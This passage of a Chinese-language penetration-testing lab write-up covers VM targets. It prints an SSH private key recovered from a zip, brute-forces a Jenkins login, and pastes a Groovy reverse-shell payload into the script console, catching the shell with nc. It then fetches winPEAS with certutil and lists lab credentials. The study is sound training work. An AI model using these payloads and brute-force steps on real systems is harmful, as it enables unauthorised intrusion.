-p using file in order to attack</span></span><br></pre></td></tr></table></figure>

<ul>
<li>找到密碼並解壓縮</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **unzip save.zip**                                                 </span><br><span class="line">Archive:  save.zip</span><br><span class="line">[save.zip] id_rsa password: </span><br><span class="line">  inflating: id_rsa                  </span><br><span class="line">  inflating: todo.txt                </span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **<span class="built_in">ls</span>**</span><br><span class="line">id_rsa  save.zip  todo.txt</span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **<span class="built_in">cat</span> todo.txt** </span><br><span class="line">- Figure out how to install the main website properly, the config file seems correct...</span><br><span class="line">- Update development website</span><br><span class="line">- Keep coding <span class="keyword">in</span> Java because it<span class="string">&#x27;s awesome</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**jp**</span></span><br><span class="line"><span class="string">                                                                                                                                       </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[/mnt/dev]</span></span><br><span class="line"><span class="string">└─# **cat id_rsa**  </span></span><br><span class="line"><span class="string">-----BEGIN OPENSSH PRIVATE KEY-----</span></span><br><span class="line"><span class="string">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDVFCI+ea</span></span><br><span class="line"><span class="string">0xYnmZX4CmL9ZbAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC/kR5x49E4</span></span><br><span class="line"><span class="string">0gkpiTPjvLVnuS3POptOks9qC3uiacuyX33vQBHcJ+vEFzkbkgvtO3RRQodNTfTEB181Pj</span></span><br><span class="line"><span class="string">3AyGSJeQu6omZha8fVHh/y2ZMRjAWRs+2nsT1Z/JONKNWMYEqQKSuhBLsMzhkUEEbw3WLq</span></span><br><span class="line"><span class="string">S0kiHCk/0VnPZ8EdMCsMGdj2MUm+ccr0GZySFg5SAJzJw2BGnjFSS+dERxb7e9tSLgDv4n</span></span><br><span class="line"><span class="string">Wg7fWw2dcG956mh1ZrPau7Gc1hFHQLLUHPgXx3Xp0f5/pGzkk6JACzCKIQj0Qo3ueb6JSC</span></span><br><span class="line"><span class="string">xWgwn6ey6XywTi9i7TdfFyCSiFW//jkeczyaQOxI/hyqYfLeiRB3AAAD0PHU/4RN8f2HUG</span></span><br><span class="line"><span class="string">ks1NM9+C9B+Fpn+nGjRj6/53m3HoBaUb/JZyvUvOXNoYnxNKIxHP5r4ytsd8X8xp5zTpi1</span></span><br><span class="line"><span class="string">tNmTeoB1kyoi2Uh70yPo4M6VlNupSeCzMQIYs/Wqya4ycyv1/yhGAPTZg8ARqop/RTQJtI</span></span><br><span class="line"><span class="string">EYVDbTxKxr7JGBfaBPiFWdUIKlN1yBXWMRrIs3SBoOaQ/n+CZKQ65mMFRs4VwqpUsRJ8y7</span></span><br><span class="line"><span class="string">ZoLZIfwaunV5f10PsCR8rp/2g563gK0bu+iVUqeo+kJMtFN7yEj2OaO6N/EdO4x/LVhqjY</span></span><br><span class="line"><span class="string">SPZD6w23mPp2I693oop1VpITsHV2talK1lLvS239gU45J4VlxFtcLjRlSAhc1ktnHw1e4u</span></span><br><span class="line"><span class="string">dRZ68JW0z2S4Y8q4EO/H4kGlZsyaf6oLCspGW1YQPhDJ2v6KkgRXyFb3tvo617yGEcBzzh</span></span><br><span class="line"><span class="string">wrVuEXObOc+zDOYgw1a/1x1pzK5vGQWaUOjN2FEz+vnSPTX3cbgUkLh3ZshuVzov0Rx7i+</span></span><br><span class="line"><span class="string">AM0CNiXVmgCGdLg0yBIv8lFIjYxswxTRkNzKYSagEZQNFCf+0H1cZcXKCK8z9a2NvBkQ/b</span></span><br><span class="line"><span class="string">rGvuoZuIjGqGvMP3Ifdma7PsG3A8GNOgWnl9YuMgc4r2WulsQVLVEJGIJjap71oNwGCUud</span></span><br><span class="line"><span class="string">T1Ou2tVn7Cf0T/NmuRmh7VUkTagDMf3u5X+UIST5Sv8y2y9jgR4x92ZL+AY968Pif1devc</span></span><br><span class="line"><span class="string">753z+GL7eWfbNqd+TJfxPdh82EqE5cmN/jYOKc0D1MC2zVChNCVWQYf4uVQ0L/XOXQXnFT</span></span><br><span class="line"><span class="string">hWdHfnf/SXos28dSM7Kx6B3jmeZQ60vk0Apas0D9gLz5xZ9GCb0Dwwka4dBSw57cwBbB3E</span></span><br><span class="line"><span class="string">PKXqJFks2ZnkyVL1W8u6ovnkpcqQz1mxr42zdC52Jc30NYww7H2G7v7FYKtf6tEyzeXG2+</span></span><br><span class="line"><span class="string">rcZwO4evWbV158rzrA4ibsGRn8+PM86LI/7T5/Y5pc2T+TAaDjKLRZ0Dtv5nMvHpigqDu4</span></span><br><span class="line"><span class="string">+e/eQk9dTmMPv9jbqcHeRo7N/Q8EC4vtXj/pCPydB5lYw/GMb8Bq5opXzADx0n4zDLtGDC</span></span><br><span class="line"><span class="string">LHcAIF6FMa+kLQHKvG1fDIK2xpLz+HxYCYTS/UAVRtWAdzQ29uG8zFAopGoQGbNA+caq7z</span></span><br><span class="line"><span class="string">iLUBEWHXJktNenIrfF3rqB3m8SNyNIn+MQS3LIakhlHAqXMIWU2pQE/0tF+V8xuKRpZvw/</span></span><br><span class="line"><span class="string">gdhLfAhm2gZMQzOe1cXWhKmtEQUntPdPAyfOTZcUtcs/pKNEjNTz5YnhQqnDbAh5x46UgZ</span></span><br><span class="line"><span class="string">q4xpWBvdz0v8qwF6LXLdPBEcT4TOg=</span></span><br><span class="line"><span class="string">-----END OPENSSH PRIVATE KEY-----</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>id_rsa  可以連線到SSH，利用這檔案連線到 <code>jp</code> 用戶，但目前還不知道密碼</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/dev]</span><br><span class="line">└─# **ssh -i id_rsa jp@192.168.19.142**                                 </span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.19.142 (192.168.19.142)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:NHMY4yX3pvvY0+B19v9tKZ+FdH9JOewJJKnKy2B0tW8.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes </span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.19.142<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">jp@192.168.19.142&#x27;</span>s password: </span><br><span class="line">Permission denied, please try again.</span><br><span class="line">jp@192.168.19.142<span class="string">&#x27;s password:</span></span><br></pre></td></tr></table></figure>

<h3 id="Walkthrough-Butler"><a href="#Walkthrough-Butler" class="headerlink" title="Walkthrough - Butler"></a><strong>Walkthrough - Butler</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Added fix <span class="keyword">for</span> NIC Power Management</span><br><span class="line"></span><br><span class="line">Added fix <span class="keyword">for</span> ServicesPipeTimeout</span><br><span class="line"> - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control</span><br><span class="line">   - New RegKey ServicesPipeTimeout</span><br><span class="line">   - New DWORD Value (32bit)</span><br><span class="line">     - Decimal 18000</span><br><span class="line"></span><br><span class="line">Disabled Windows Firewall </span><br><span class="line">Disabled Windows Defender AV </span><br><span class="line">Disabled Windows Update </span><br><span class="line">Removed any existing Windows Updates</span><br></pre></td></tr></table></figure>

<ul>
<li>Low Privilege User - butler:JeNkIn5@44</li>
<li>Admin - administrator:A%rc!BcA!</li>
<li>ip - 192.168.19.142</li>
</ul>
<p>查看到網頁8080port先去開網頁查看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -T4 -A -p- 192.168.19.143</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-17 00:31 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.143</span><br><span class="line">Host is up (0.00095s latency).</span><br><span class="line">Not shown: 65523 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">**135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">5040/tcp  open  unknown</span><br><span class="line">7680/tcp  open  pando-pub?</span><br><span class="line">8080/tcp  open  http          Jetty 9.4.41.v20210516**</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: Jetty(9.4.41.v20210516)</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html;charset=utf-8).</span></span><br><span class="line"><span class="string">49664/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49665/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49666/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49667/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49668/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49670/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">MAC Address: 00:0C:29:26:C4:D4 (VMware)</span></span><br><span class="line"><span class="string">Device type: general purpose</span></span><br><span class="line"><span class="string">Running: Microsoft Windows 10</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:microsoft:windows_10</span></span><br><span class="line"><span class="string">OS details: Microsoft Windows 10 1709 - 1909</span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">|_nbstat: NetBIOS name: BUTLER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:26:c4:d4 (VMware)</span></span><br><span class="line"><span class="string">|_clock-skew: 15h59m58s</span></span><br><span class="line"><span class="string">| smb2-time: </span></span><br><span class="line"><span class="string">|   date: 2024-02-17T21:34:18</span></span><br><span class="line"><span class="string">|_  start_date: N/A</span></span><br><span class="line"><span class="string">| smb2-security-mode: </span></span><br><span class="line"><span class="string">|   3:1:1: </span></span><br><span class="line"><span class="string">|_    Message signing enabled but not required</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE</span></span><br><span class="line"><span class="string">HOP RTT     ADDRESS</span></span><br><span class="line"><span class="string">1   0.95 ms 192.168.19.143</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 198.01 seconds</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查看網頁open source也沒有發現特別可以利用的東西</li>
</ul>
<p><img src="/img/privilege_Untitled_23.png" alt="Untitled"></p>
<ul>
<li>查找Jenkins漏洞</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security">https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/gquere/pwn_jenkins">https://github.com/gquere/pwn_jenkins</a></p>
<ul>
<li><p>查看jenkins default passwd</p>
<ul>
<li>admin&#x2F;password</li>
<li>嘗試用它做利用</li>
</ul>
<p>  <img src="/img/privilege_Untitled_24.png" alt="Untitled"></p>
<p>  <img src="/img/privilege_Untitled_25.png" alt="Untitled">
  </p>
</li>
<li><p>嘗試7680 port的開啟，不確定這port用途可以開goole查看或網頁開啟試試</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **apt install telnet**</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree... Done</span><br><span class="line">Reading state information... Done</span><br><span class="line">telnet is already the newest version (0.17+2.5-3).</span><br><span class="line">telnet <span class="built_in">set</span> to manually installed.</span><br><span class="line">0 upgraded, 0 newly installed, 0 to remove and 123 not upgraded.</span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# telnet 192.168.19.143 7680</span><br><span class="line">Trying 192.168.19.143...</span><br><span class="line">telnet: Unable to connect to remote host: Connection refused</span><br></pre></td></tr></table></figure>

<p><img src="/img/privilege_Untitled_26.png" alt="Untitled"></p>
<ul>
<li>brute force Jenkins</li>
</ul>
<p>通過foxyproxy攔截封包 &gt; Intruder &amp; Repeater</p>
<p><img src="/img/privilege_Untitled_27.png" alt="Untitled"></p>
<ul>
<li>Intruder 當有兩參數時，可以選擇要Pitchfork還是Cluster bomb</li>
<li>兩者差異主要是<ul>
<li>Pitchfork &gt; 1 to 1<ul>
<li>帳號 vs 密碼，順序比對</li>
</ul>
</li>
<li>Cluster bomb &gt; 1 to all<ul>
<li>一帳號 vs 全密碼依序比對</li>
</ul>
</li>
</ul>
</li>
<li>這邊選擇Cluster bomb，因為我們不確定admin跟passwd的任何一方</li>
</ul>
<p><img src="/img/privilege_Untitled_28.png" alt="Untitled"></p>
<p>輸入極有可能會出現的帳號及密碼</p>
<p><img src="/img/privilege_Untitled_29.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_30.png" alt="Untitled"></p>
<p>通過查看爆破後的長度，會發現有一個特別不一樣，嘗試登入</p>
<ul>
<li>通過比對長度不同的網頁回應會看到兩者有些許差異</li>
</ul>
<p><img src="/img/privilege_Untitled_31.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_32.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_33.png" alt="Untitled"></p>
<p>成功登入後看到Jenkins版本 &gt; 2.289.3，這對滲透測試來說是不錯的訊息</p>
<p><img src="/img/privilege_Untitled_34.png" alt="Untitled"></p>
<p>也通過hacktricks告訴我們的資訊，嘗試利用</p>
<p><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security">https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security</a></p>
<p>察看到這邊有很多功能</p>
<ul>
<li>注意到CLI，也許可以用它運行shell</li>
<li>script console &gt; Groovy script，前面在做資訊蒐集時有看到Groovy似乎是能拿來利用</li>
</ul>
<p><img src="/img/privilege_Untitled_35.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_36.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_37.png" alt="Untitled"></p>
<p>查詢google &gt; Groovy script exploit </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76</a></li>
<li><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-with-groovy-script">https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-with-groovy-script</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6">https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6</a></li>
<li><a target="_blank" rel="noopener" href="https://coldfusionx.github.io/posts/Groovy_RCE/">https://coldfusionx.github.io/posts/Groovy_RCE&#x2F;</a></li>
</ul>
<p>可以通過一些Reverse shell利用，貼到script console中，並開啟nc監聽，再console中運行下列指令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">String host=<span class="string">&quot;localhost&quot;</span>; <span class="comment">#換成attacker IP</span></span><br><span class="line">int port=8044;</span><br><span class="line">String cmd=<span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">Process p=new ProcessBuilder(cmd).redirectErrorStream(<span class="literal">true</span>).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="keyword">while</span>(!s.isClosed())&#123;<span class="keyword">while</span>(pi.available()&gt;0)so.write(pi.read());<span class="keyword">while</span>(pe.available()&gt;0)so.write(pe.read());<span class="keyword">while</span>(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.<span class="built_in">sleep</span>(50);try &#123;p.exitValue();<span class="built_in">break</span>;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure>

<p><img src="/img/privilege_Untitled_38.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nc -nlvp 8044**                 </span><br><span class="line">listening on [any] 8044 ...</span><br><span class="line">connect to [192.168.19.130] from (UNKNOWN) [192.168.19.143] 49724</span><br><span class="line">Microsoft Windows [Version 10.0.19043.928]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Program Files\Jenkins&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">butler\butler</span><br></pre></td></tr></table></figure>

<ul>
<li>我們不是最高權限用戶，嘗試提權</li>
</ul>
<p>查看該機器資訊 <code>systeminfo</code> 版本資訊可以尋找該版本是否有利用點</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Jenkins&gt;**systeminfo**</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">Host Name:                 BUTLER</span><br><span class="line">OS Name:                   Microsoft Windows 10 Enterprise Evaluation</span><br><span class="line">**OS Version:                10.0.19043 N/A Build 19043**</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Standalone Workstation</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          butler</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00329-20000-00001-AA079</span><br><span class="line">Original Install Date:     8/14/2021, 3:51:38 AM</span><br><span class="line">System Boot Time:          2/16/2024, 10:49:03 PM</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware7,1</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              2 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 23 Model 96 Stepping 1 AuthenticAMD ~2895 Mhz</span><br><span class="line">                           [02]: AMD64 Family 23 Model 96 Stepping 1 AuthenticAMD ~2895 Mhz</span><br><span class="line">BIOS Version:              VMware, Inc. VMW71.00V.16722896.B64.2008100651, 8/10/2020</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume1</span><br><span class="line">System Locale:             en-us;English (United States)</span><br><span class="line">Input Locale:              en-us;English (United States)</span><br><span class="line">Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)</span><br><span class="line">Total Physical Memory:     2,047 MB</span><br><span class="line">Available Physical Memory: 1,545 MB</span><br><span class="line">Virtual Memory: Max Size:  3,199 MB</span><br><span class="line">Virtual Memory: Available: 2,260 MB</span><br><span class="line">Virtual Memory: In Use:    939 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    WORKGROUP</span><br><span class="line">Logon Server:              N/A</span><br><span class="line">Hotfix(s):                 4 Hotfix(s) Installed.</span><br><span class="line">                           [01]: KB4601554</span><br><span class="line">                           [02]: KB5000736</span><br><span class="line">                           [03]: KB5001330</span><br><span class="line">                           [04]: KB5001405</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: Intel(R) 82574L Gigabit Network Connection</span><br><span class="line">                                 Connection Name: Ethernet0</span><br><span class="line">                                 DHCP Enabled:    Yes</span><br><span class="line">                                 DHCP Server:     192.168.19.254</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 192.168.19.143</span><br><span class="line">                                 [02]: fe80::94cd:4577:bcd4:f41f</span><br><span class="line">Hyper-V Requirements:      A hypervisor has been detected. Features required <span class="keyword">for</span> Hyper-V will not be displayed.</span><br></pre></td></tr></table></figure>

<p>windows 提權工具 &gt;winpeas</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master">https://github.com/carlospolop/PEASS-ng/tree/master</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/releases/download/20240211-db8c669a/winPEASx64.exe">https://github.com/carlospolop/PEASS-ng/releases/download/20240211-db8c669a/winPEASx64.exe</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Jenkins&gt;<span class="built_in">cd</span> c:\<span class="built_in">users</span>    </span><br><span class="line"><span class="built_in">cd</span> c:\<span class="built_in">users</span></span><br><span class="line"></span><br><span class="line">c:\Users&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users</span><br><span class="line"></span><br><span class="line">08/14/2021  04:29 AM    &lt;DIR&gt;          .</span><br><span class="line">08/14/2021  04:29 AM    &lt;DIR&gt;          ..</span><br><span class="line">08/14/2021  04:30 AM    &lt;DIR&gt;          Administrator</span><br><span class="line">**08/15/2021  04:23 PM    &lt;DIR&gt;          butler**</span><br><span class="line">08/14/2021  05:25 AM    &lt;DIR&gt;          Public</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               5 Dir(s)  11,740,917,760 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users&gt;<span class="built_in">cd</span> butler</span><br><span class="line"><span class="built_in">cd</span> butler</span><br><span class="line"></span><br><span class="line">c:\Users\butler&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\butler</span><br><span class="line"></span><br><span class="line">08/15/2021  04:23 PM    &lt;DIR&gt;          .</span><br><span class="line">08/15/2021  04:23 PM    &lt;DIR&gt;          ..</span><br><span class="line">08/14/2021  04:16 AM    &lt;DIR&gt;          .groovy</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          3D Objects</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Contacts</span><br><span class="line">**08/14/2021  03:54 AM    &lt;DIR&gt;          Desktop</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Documents</span><br><span class="line">08/14/2021  04:23 AM    &lt;DIR&gt;          Downloads**</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Favorites</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Links</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Music</span><br><span class="line">08/14/2021  03:56 AM    &lt;DIR&gt;          OneDrive</span><br><span class="line">08/14/2021  03:55 AM    &lt;DIR&gt;          Pictures</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Saved Games</span><br><span class="line">08/14/2021  03:55 AM    &lt;DIR&gt;          Searches</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Videos</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">              16 Dir(s)  11,740,901,376 bytes free</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看目錄可能會有些有用的內容</span></span><br><span class="line"></span><br><span class="line">c:\Users\butler&gt;<span class="built_in">cd</span> Downloads</span><br><span class="line"><span class="built_in">cd</span> Downloads</span><br><span class="line"></span><br><span class="line">c:\Users\butler\Downloads&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\butler\Downloads</span><br><span class="line"></span><br><span class="line">08/14/2021  04:23 AM    &lt;DIR&gt;          .</span><br><span class="line">08/14/2021  04:23 AM    &lt;DIR&gt;          ..</span><br><span class="line">**08/14/2021  04:23 AM        16,013,912 WiseCare365_5.6.7.568.exe**</span><br><span class="line">               1 File(s)     16,013,912 bytes</span><br><span class="line">               2 Dir(s)  11,740,901,376 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users\butler\Downloads&gt;<span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line">c:\Users\butler&gt;<span class="built_in">cd</span> Desktop</span><br><span class="line"><span class="built_in">cd</span> Desktop</span><br><span class="line"></span><br><span class="line">c:\Users\butler\Desktop&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\butler\Desktop</span><br><span class="line"></span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          .</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          ..</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               2 Dir(s)  11,740,901,376 bytes free</span><br></pre></td></tr></table></figure>

<p>主要遠程將winpeas放到用戶目錄下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c:\Users\butler&gt;**certutil.exe -urlcache -f http://192.168.19.130/winpeas.exe winpeas.exe**</span><br><span class="line">certutil.exe -urlcache -f http://192.168.19.130/winpeas.exe winpeas.exe</span><br><span class="line">****  Online  ****</span><br><span class="line">CertUtil: -URLCache <span class="built_in">command</span> completed successfully.</span><br><span class="line"></span><br><span class="line">c:\Users\butler&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 1067-CB24</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\butler</span><br><span class="line"></span><br><span class="line">02/16/2024  11:42 PM    &lt;DIR&gt;          .</span><br><span class="line">02/16/2024  11:42 PM    &lt;DIR&gt;          ..</span><br><span class="line">08/14/2021  04:16 AM    &lt;DIR&gt;          .groovy</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          3D Objects</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Contacts</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Desktop</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Documents</span><br><span class="line">08/14/2021  04:23 AM    &lt;DIR&gt;          Downloads</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Favorites</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Links</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Music</span><br><span class="line">08/14/2021  03:56 AM    &lt;DIR&gt;          OneDrive</span><br><span class="line">08/14/2021  03:55 AM    &lt;DIR&gt;          Pictures</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Saved Games</span><br><span class="line">08/14/2021  03:55 AM    &lt;DIR&gt;          Searches</span><br><span class="line">08/14/2021  03:54 AM    &lt;DIR&gt;          Videos</span><br><span class="line">02/16/2024  11:43 PM         2,387,456 winpeas.exe</span><br><span class="line">               1 File(s)      2,387,456 bytes</span><br><span class="line">              16 Dir(s)  11,735,945,216 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users\butler&gt;winpeas.exe</span><br><span class="line">winpeas.exe</span><br><span class="line">ANSI color bit <span class="keyword">for</span> Windows is not <span class="built_in">set</span>. If you are executing this from a Windows terminal inside the host you should run <span class="string">&#x27;REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1&#x27;</span> and <span class="keyword">then</span> start a new CMD</span><br><span class="line">Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause <span class="literal">false</span> negatives when looking <span class="keyword">for</span> files). If you are admin, you can <span class="built_in">enable</span> it with <span class="string">&#x27;**REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1**&#x27;</span> and <span class="keyword">then</span> start a new CMD</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">[+] Legend:</span><br><span class="line">         **Red                Indicates a special privilege over an object or something is misconfigured**</span><br><span class="line">         Green              Indicates that some protection is enabled or something is well configured</span><br><span class="line">         Cyan               Indicates active <span class="built_in">users</span></span><br><span class="line">         Blue               Indicates disabled <span class="built_in">users</span></span><br><span class="line">         LightYellow        Indicates links</span><br><span class="line">....</span><br><span class="line">����������͹ Current Token privileges</span><br><span class="line">� Check <span class="keyword">if</span> you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation                                                                                                            </span><br><span class="line">    SeIncreaseQuotaPrivilege: DISABLED</span><br><span class="line">    SeSecurityPrivilege: DISABLED</span><br><span class="line">    SeTakeOwnershipPrivilege: DISABLED</span><br><span class="line">    SeLoadDriverPrivilege: DISABLED</span><br><span class="line">    